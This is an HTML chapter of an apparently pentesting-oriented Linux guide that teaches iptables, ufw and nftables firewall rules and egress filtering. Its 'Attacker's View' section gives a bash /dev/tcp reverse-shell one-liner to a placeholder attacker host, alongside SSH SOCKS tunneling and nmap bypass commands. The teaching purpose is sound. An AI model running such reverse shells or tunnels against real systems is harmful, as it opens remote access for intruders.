@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Chapter 16 of the 0XMAP Linux for Hackers field guide. Inspect iptables and UFW rules and think in terms of allowed and denied paths.">
+  <title>Chapter 16: Firewalls and Packet Filtering (iptables and ufw) | 0XMAP Linux Field Guide</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Chapter 16</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Chapter navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Chapters</p>
+      <p class="g-sidebar-count">30 chapters / 5 sections</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close chapter menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">01</span><span>Foundations</span></div><ol><li><a class="g-nav-link" href="../chapters/01-introduction-and-why-linux-matters-in-hacking.html" ><span class="g-nav-num">01</span><span class="g-nav-title">Why Linux matters</span></a></li><li><a class="g-nav-link" href="../chapters/02-basic-file-navigation-in-linux.html" ><span class="g-nav-num">02</span><span class="g-nav-title">File navigation</span></a></li><li><a class="g-nav-link" href="../chapters/03-understanding-linux-file-permissions.html" ><span class="g-nav-num">03</span><span class="g-nav-title">File permissions</span></a></li><li><a class="g-nav-link" href="../chapters/04-users-groups-and-privilege-escalation-basics.html" ><span class="g-nav-num">04</span><span class="g-nav-title">Users and groups</span></a></li><li><a class="g-nav-link" href="../chapters/05-linux-package-managers-and-dependency-abuse.html" ><span class="g-nav-num">05</span><span class="g-nav-title">Package managers</span></a></li><li><a class="g-nav-link" href="../chapters/06-introduction-to-bash-scripting.html" ><span class="g-nav-num">06</span><span class="g-nav-title">Bash scripting</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">02</span><span>Shell and scheduling</span></div><ol><li><a class="g-nav-link" href="../chapters/07-bash-variables-arguments-and-dynamic-scripting.html" ><span class="g-nav-num">07</span><span class="g-nav-title">Bash variables</span></a></li><li><a class="g-nav-link" href="../chapters/08-environment-variables-and-bashrc-abuse.html" ><span class="g-nav-num">08</span><span class="g-nav-title">Shell startup abuse</span></a></li><li><a class="g-nav-link" href="../chapters/09-processes-services-and-enumeration.html" ><span class="g-nav-num">09</span><span class="g-nav-title">Processes and services</span></a></li><li><a class="g-nav-link" href="../chapters/10-cron-jobs-scheduled-tasks-and-exploitation.html" ><span class="g-nav-num">10</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link" href="../chapters/11-ssh-access-and-abuse.html" ><span class="g-nav-num">11</span><span class="g-nav-title">SSH access and abuse</span></a></li><li><a class="g-nav-link" href="../chapters/12-file-permissions-and-privilege-escalation-basics.html" ><span class="g-nav-num">12</span><span class="g-nav-title">Permissions to privilege</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">03</span><span>Access and network</span></div><ol><li><a class="g-nav-link" href="../chapters/13-environment-variables-and-path-hijacking.html" ><span class="g-nav-num">13</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link" href="../chapters/14-logs-and-system-auditing.html" ><span class="g-nav-num">14</span><span class="g-nav-title">Logs and auditing</span></a></li><li><a class="g-nav-link" href="../chapters/15-networking-fundamentals-for-hackers.html" ><span class="g-nav-num">15</span><span class="g-nav-title">Networking</span></a></li><li><a class="g-nav-link" href="../chapters/16-firewalls-and-packet-filtering.html"  aria-current="page"><span class="g-nav-num">16</span><span class="g-nav-title">Firewalls</span></a></li><li><a class="g-nav-link" href="../chapters/17-ssh-and-tunneling.html" ><span class="g-nav-num">17</span><span class="g-nav-title">SSH tunneling</span></a></li><li><a class="g-nav-link" href="../chapters/18-linux-kernel-and-exploit-basics.html" ><span class="g-nav-num">18</span><span class="g-nav-title">Kernel exploits</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">04</span><span>Persistence and isolation</span></div><ol><li><a class="g-nav-link" href="../chapters/19-linux-persistence-techniques.html" ><span class="g-nav-num">19</span><span class="g-nav-title">Persistence</span></a></li><li><a class="g-nav-link" href="../chapters/20-linux-services-and-daemon-exploitation.html" ><span class="g-nav-num">20</span><span class="g-nav-title">Service exploitation</span></a></li><li><a class="g-nav-link" href="../chapters/21-linux-capabilities-and-exploitation.html" ><span class="g-nav-num">21</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link" href="../chapters/22-advanced-persistence.html" ><span class="g-nav-num">22</span><span class="g-nav-title">Advanced persistence</span></a></li><li><a class="g-nav-link" href="../chapters/23-containers-and-docker-exploitation.html" ><span class="g-nav-num">23</span><span class="g-nav-title">Containers</span></a></li><li><a class="g-nav-link" href="../chapters/24-host-based-monitoring-auditd-and-osquery.html" ><span class="g-nav-num">24</span><span class="g-nav-title">Host monitoring</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">05</span><span>Defense and workflow</span></div><ol><li><a class="g-nav-link" href="../chapters/25-linux-forensics-and-incident-response.html" ><span class="g-nav-num">25</span><span class="g-nav-title">Forensics and IR</span></a></li><li><a class="g-nav-link" href="../chapters/26-automating-linux-privilege-escalation-checks.html" ><span class="g-nav-num">26</span><span class="g-nav-title">Privilege automation</span></a></li><li><a class="g-nav-link" href="../chapters/27-linux-hardening-and-monitoring.html" ><span class="g-nav-num">27</span><span class="g-nav-title">Hardening and monitoring</span></a></li><li><a class="g-nav-link" href="../chapters/28-network-sniffing-and-packet-capture.html" ><span class="g-nav-num">28</span><span class="g-nav-title">Packet capture</span></a></li><li><a class="g-nav-link" href="../chapters/29-linux-memory-analysis-and-credential-hunting.html" ><span class="g-nav-num">29</span><span class="g-nav-title">Memory analysis</span></a></li><li><a class="g-nav-link" href="../chapters/30-building-your-linux-hacking-workflow.html" ><span class="g-nav-num">30</span><span class="g-nav-title">Workflow</span></a></li></ol></section>
+  </nav>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#privesc">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Privilege Escalation</strong>
+    <span>10 parts from sudo to NFS and kernel bugs</span>
+  </a>
+  <p class="g-sidebar-note">Authorized labs and systems only. Read in order or use the menu to jump.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#section-access">Section 03</a><span>/</span>
+          <span>Chapter 16</span>
+        </nav>
+        <p class="g-kicker">Section 03 / Access and network</p>
+        <h1>Firewalls and Packet Filtering (iptables and ufw)</h1>
+        <p class="g-deck">Inspect iptables and UFW rules and think in terms of allowed and denied paths.</p>
+        <div class="g-chapter-meta">
+          <span>6 min read</span>
+          <span>10 sections</span>
+          <span>10 code blocks</span>
+          <span>Chapter 16 / 30</span>
+        </div>
+        <div class="g-chapter-actions"><a class="g-btn ghost" data-next-chapter href="../chapters/17-ssh-and-tunneling.html">Next chapter <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg></a></div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>10 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#1-understanding-iptables" data-toc-link>1. Understanding iptables</a><a class="g-toc-link depth-3" href="#viewing-rules" data-toc-link>Viewing rules</a><a class="g-toc-link depth-3" href="#adding-rules" data-toc-link>Adding rules</a><a class="g-toc-link depth-2" href="#2-ufw-uncomplicated-firewall" data-toc-link>2. UFW - Uncomplicated Firewall</a><a class="g-toc-link depth-3" href="#basic-commands" data-toc-link>Basic commands</a><a class="g-toc-link depth-2" href="#3-attacker-s-view" data-toc-link>3. Attacker’s View</a><a class="g-toc-link depth-2" href="#4-real-world-pentesting-scenarios" data-toc-link>4. Real-World Pentesting Scenarios</a><a class="g-toc-link depth-2" href="#5-practical-tasks" data-toc-link>5. Practical Tasks</a><a class="g-toc-link depth-2" href="#advanced-nftables-xdp-and-modern-filtering" data-toc-link>Advanced: nftables, XDP and modern filtering</a><a class="g-toc-link depth-2" href="#6-key-takeaways" data-toc-link>6. Key Takeaways</a></nav>
+</details>
+      <div class="g-prose"><p>Firewalls are one of the first layers of defense in any Linux system. As hackers or pentesters, understanding how they work - and how to bypass them - is essential.</p>
+<hr/>
+<h2 id="1-understanding-iptables">1. Understanding iptables<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-iptables">#</a></h2>
+<p><code>iptables</code> is the traditional firewall tool in Linux. It controls the traffic that flows in and out of the system.</p>
+<ul>
+<li>
+<p><strong>Tables</strong>:</p>
+<ul>
+<li><code>filter</code> → default, used for packet filtering</li>
+<li><code>nat</code> → used for network address translation (e.g., port forwarding)</li>
+<li><code>mangle</code> → advanced packet modification</li>
+</ul>
+</li>
+<li>
+<p><strong>Chains</strong>:</p>
+<ul>
+<li><code>INPUT</code> → incoming traffic</li>
+<li><code>OUTPUT</code> → outgoing traffic</li>
+<li><code>FORWARD</code> → traffic routed through the system</li>
+</ul>
+</li>
+</ul>
+<h3 id="viewing-rules">Viewing rules<a aria-label="Link to this section" class="g-anchor" href="#viewing-rules">#</a></h3>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">iptables<span class="w"> </span>-L<span class="w"> </span>-n<span class="w"> </span>-v
+</code></pre></div>
+<h3 id="adding-rules">Adding rules<a aria-label="Link to this section" class="g-anchor" href="#adding-rules">#</a></h3>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">22</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT<span class="w">   </span><span class="c1"># Allow SSH</span>
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-j<span class="w"> </span>DROP<span class="w">                       </span><span class="c1"># Drop everything else</span>
+</code></pre></div>
+<hr/>
+<h2 id="2-ufw-uncomplicated-firewall">2. UFW - Uncomplicated Firewall<a aria-label="Link to this section" class="g-anchor" href="#2-ufw-uncomplicated-firewall">#</a></h2>
+<p><code>ufw</code> is a simpler frontend to <code>iptables</code>.</p>
+<h3 id="basic-commands">Basic commands<a aria-label="Link to this section" class="g-anchor" href="#basic-commands">#</a></h3>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">ufw<span class="w"> </span>status
+ufw<span class="w"> </span><span class="nb">enable</span>
+ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">80</span>/tcp
+ufw<span class="w"> </span>deny<span class="w"> </span><span class="m">23</span>/tcp
+ufw<span class="w"> </span>default<span class="w"> </span>deny<span class="w"> </span>incoming
+ufw<span class="w"> </span>default<span class="w"> </span>allow<span class="w"> </span>outgoing
+</code></pre></div>
+<p>This simplifies firewall management for administrators.</p>
+<hr/>
+<h2 id="3-attacker-s-view">3. Attacker’s View<a aria-label="Link to this section" class="g-anchor" href="#3-attacker-s-view">#</a></h2>
+<p>Firewalls create barriers, but attackers always look for misconfigurations:</p>
+<ul>
+<li>
+<p><strong>Port scanning:</strong></p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">nmap<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>target.com
+</code></pre></div>
+<p>(<code>-Pn</code> skips ICMP echo, useful if ping is blocked.)</p>
+</li>
+<li>
+<p><strong>Tunneling:</strong><br/>
+Attackers often tunnel traffic to bypass firewalls:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@target.com
+</code></pre></div>
+<p>(Creates a SOCKS proxy.)</p>
+</li>
+<li>
+<p><strong>Outbound traffic:</strong><br/>
+Even if inbound is locked, many firewalls allow outbound. This can be abused for reverse shells:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/attacker-ip/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+</li>
+</ul>
+<hr/>
+<h2 id="4-real-world-pentesting-scenarios">4. Real-World Pentesting Scenarios<a aria-label="Link to this section" class="g-anchor" href="#4-real-world-pentesting-scenarios">#</a></h2>
+<ul>
+<li>Misconfigured firewalls with <code>ACCEPT</code> rules before restrictive ones.</li>
+<li>Firewalls allowing “trusted” IPs that attackers can spoof.</li>
+<li>Services bound to <code>0.0.0.0</code> but intended only for localhost.</li>
+</ul>
+<hr/>
+<h2 id="5-practical-tasks">5. Practical Tasks<a aria-label="Link to this section" class="g-anchor" href="#5-practical-tasks">#</a></h2>
+<ol>
+<li>
+<p>List all current firewall rules on your machine.</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">iptables<span class="w"> </span>-L<span class="w"> </span>-n<span class="w"> </span>-v
+</code></pre></div>
+</li>
+<li>
+<p>Block SSH access (port 22) with iptables, then try to connect.</p>
+</li>
+<li>
+<p>Using <code>ufw</code>, configure your system to:</p>
+<ul>
+<li>Allow HTTP (80) and HTTPS (443).</li>
+<li>Deny all other inbound connections.</li>
+</ul>
+</li>
+<li>
+<p>Simulate bypass: Run <code>nmap</code> with <code>-Pn</code> against a target with ICMP blocked.</p>
+</li>
+</ol>
+<hr/>
+<h2 id="advanced-nftables-xdp-and-modern-filtering">Advanced: nftables, XDP and modern filtering<a aria-label="Link to this section" class="g-anchor" href="#advanced-nftables-xdp-and-modern-filtering">#</a></h2>
+<p><code>iptables</code> still works through the <code>iptables-nft</code> compatibility layer, but new
+deployments should use <code>nftables</code>. It provides one ruleset for IPv4, IPv6, ARP
+and bridges, atomic updates, sets, maps and better performance with large
+blocklists.</p>
+<p>A minimal default-deny input policy:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>table<span class="w"> </span>inet<span class="w"> </span>filter
+sudo<span class="w"> </span>nft<span class="w"> </span><span class="s1">'add chain inet filter input { type filter hook input priority 0; policy drop; }'</span>
+sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>rule<span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>input<span class="w"> </span>iif<span class="w"> </span>lo<span class="w"> </span>accept
+sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>rule<span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>input<span class="w"> </span>ct<span class="w"> </span>state<span class="w"> </span>established,related<span class="w"> </span>accept
+sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>rule<span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>input<span class="w"> </span>tcp<span class="w"> </span>dport<span class="w"> </span><span class="s1">'{ 22, 443 }'</span><span class="w"> </span>accept
+sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>rule<span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>input<span class="w"> </span>ip<span class="w"> </span>protocol<span class="w"> </span>icmp<span class="w"> </span>accept
+sudo<span class="w"> </span>nft<span class="w"> </span>list<span class="w"> </span>ruleset
+</code></pre></div>
+<p>Use sets for blocklists and rate limits. Rule order matters, so place a
+rate-limited rule before a broad accept:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span><span class="nb">set</span><span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>blocklist<span class="w"> </span><span class="s1">'{ type ipv4_addr; flags timeout; }'</span>
+sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>element<span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>blocklist<span class="w"> </span><span class="s1">'{ 203.0.113.10 timeout 1h }'</span>
+sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>rule<span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>input<span class="w"> </span>ip<span class="w"> </span>saddr<span class="w"> </span>@blocklist<span class="w"> </span>drop
+sudo<span class="w"> </span>nft<span class="w"> </span>add<span class="w"> </span>rule<span class="w"> </span>inet<span class="w"> </span>filter<span class="w"> </span>input<span class="w"> </span>tcp<span class="w"> </span>dport<span class="w"> </span><span class="m">2222</span><span class="w"> </span>limit<span class="w"> </span>rate<span class="w"> </span><span class="m">10</span>/minute<span class="w"> </span>accept
+</code></pre></div>
+<p>For high-throughput filtering, XDP runs an eBPF program at the driver ingress
+path before the kernel allocates an skb. It is useful for DDoS dropping and
+packet sampling, but it is not a replacement for stateful firewalling.
+Inspect loaded programs with:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">sudo<span class="w"> </span>bpftool<span class="w"> </span>prog<span class="w"> </span>list
+sudo<span class="w"> </span>bpftool<span class="w"> </span>net
+ip<span class="w"> </span>link<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span>eth0
+</code></pre></div>
+<p><code>bpfilter</code> can translate <code>iptables</code> rules into BPF, and <code>tc</code> eBPF programs
+handle egress shaping and filtering. In Kubernetes, NetworkPolicy and
+eBPF-based CNIs such as Cilium move enforcement closer to the pod.</p>
+<p>Operational notes:</p>
+<ul>
+<li>Keep rules in version-controlled files and apply them with <code>nft -f</code>.</li>
+<li>Use <code>nft monitor trace</code> with a trace rule in a lab; tracing every packet is
+expensive.</li>
+<li>Test changes over a serial console or with a rollback timer on remote hosts.</li>
+<li>Default-deny inbound, but do not assume outbound is safe. Egress filtering
+limits data theft and command-and-control.</li>
+</ul>
+<h2 id="6-key-takeaways">6. Key Takeaways<a aria-label="Link to this section" class="g-anchor" href="#6-key-takeaways">#</a></h2>
+<ul>
+<li>Firewalls filter traffic using rules in tables/chains.</li>
+<li><code>iptables</code> gives fine control; <code>ufw</code> simplifies management.</li>
+<li>Attackers focus on misconfigurations, tunneling, and outbound traffic.</li>
+<li>Always test firewall behavior during pentests.</li>
+</ul>
+<hr/>
+</div>
+      <p class="g-source-note">Chapter 16 of the Linux for Hackers guide. Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+      <nav class="g-chapter-nav" aria-label="Chapter navigation"><a class="g-chapter-card" href="../chapters/15-networking-fundamentals-for-hackers.html" data-prev-chapter><span class="g-chapter-card-label">Previous / Chapter 15</span><strong>Networking Fundamentals for Hackers</strong></a><a class="g-chapter-card" href="../chapters/17-ssh-and-tunneling.html" data-next-chapter><span class="g-chapter-card-label">Next / Chapter 17</span><strong>Secure Shell (SSH) and Tunneling Tricks</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#1-understanding-iptables" data-toc-link>1. Understanding iptables</a><a class="g-toc-link depth-3" href="#viewing-rules" data-toc-link>Viewing rules</a><a class="g-toc-link depth-3" href="#adding-rules" data-toc-link>Adding rules</a><a class="g-toc-link depth-2" href="#2-ufw-uncomplicated-firewall" data-toc-link>2. UFW - Uncomplicated Firewall</a><a class="g-toc-link depth-3" href="#basic-commands" data-toc-link>Basic commands</a><a class="g-toc-link depth-2" href="#3-attacker-s-view" data-toc-link>3. Attacker’s View</a><a class="g-toc-link depth-2" href="#4-real-world-pentesting-scenarios" data-toc-link>4. Real-World Pentesting Scenarios</a><a class="g-toc-link depth-2" href="#5-practical-tasks" data-toc-link>5. Practical Tasks</a><a class="g-toc-link depth-2" href="#advanced-nftables-xdp-and-modern-filtering" data-toc-link>Advanced: nftables, XDP and modern filtering</a><a class="g-toc-link depth-2" href="#6-key-takeaways" data-toc-link>6. Key Takeaways</a></nav>
+    <div class="g-toc-foot">Chapter 16 / 10 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
